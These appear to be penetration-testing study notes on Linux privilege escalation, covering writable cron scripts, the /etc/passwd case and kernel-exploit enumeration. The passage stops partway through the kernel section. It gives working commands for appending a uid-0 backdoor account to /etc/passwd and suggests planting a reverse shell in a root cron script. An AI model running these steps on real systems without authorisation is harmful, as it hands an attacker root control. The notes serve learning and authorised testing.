## Privilege Escalation

### Understanding Linux Privileges

Most resources on Linux are represented as files in the filesystem.

### Insecure File Permissions

Every file has 3 basic permissions - read/write/execute

Goal of Insecure File Permission privilege escalation is to find a file we have write access to that also runs as a privileged user.

#### CRON Case Study

Cron is a good target since they run with root privileges and admins often create scripts with insecure permissions.

Check the logfile for Cron jobs:

```bash
grep "CRON" /var/log/cron.log
```

From here, we can see what scripts are executed by which user and frequency of the script runtime.

If a suitable file is found, check the file and see if the permissions allow for it to be overwritten.  If so, you can inject anything, like a reverse shell, which will run as root.

#### /etc/passwd Case Study

While Linux now uses the protected file /etc/shadow to store password hashes, the file /etc/passwd was once used to do this.  For backwards compatibility, if a hash is found in /etc/passwd, it will be considered as valid for the purposes of authentication and takes precedence over /etc/shadow.  

The effect is, if write access is available on /etc/passwd, then any user's password can be changed by adding a hash to this file and overriding /etc/shadow.

1. Check the permissions of /etc/passwd to see if write access is available.

   ```bash
   ls -lah /etc/passwd
   ```

2. If so, generate a password hash using the crypt algorithm, which Linux supports for authentication, to be inserted into this file:

   ```bash
   openssl passwd newpass
   ```

3. Insert a new line into /etc/passwd using this hash in the correct format, using user and group ID's of 0 to indicate the root user.

   ```bash
   echo "root2:TpiunMT/aK7zA:0:0:root:/root:/bin/bash" >> /etc/passwd
   ```

4. Verify you are able to login to the new account:

   ```bash
   su root2
   id
   ```


### Linux Kernel Vulnerabilities

#### CVE-2017-1000112 Case Study

Success depends not only on matching the kernel version, but also the OS 'Flavor' like Debian/Red Hat/etc.

1. Enumerate the OS version and architecture

   ```bash
   # OS Release
   cat /etc/issue
   # Kernel
   uname -r
   # Architecture
   arch
   ```

2. Search for exploits matching the target information and look for matches with the same kernel version:

   ```bash
   searchsploit linux kernel ubuntu 16.04
   ```

3. 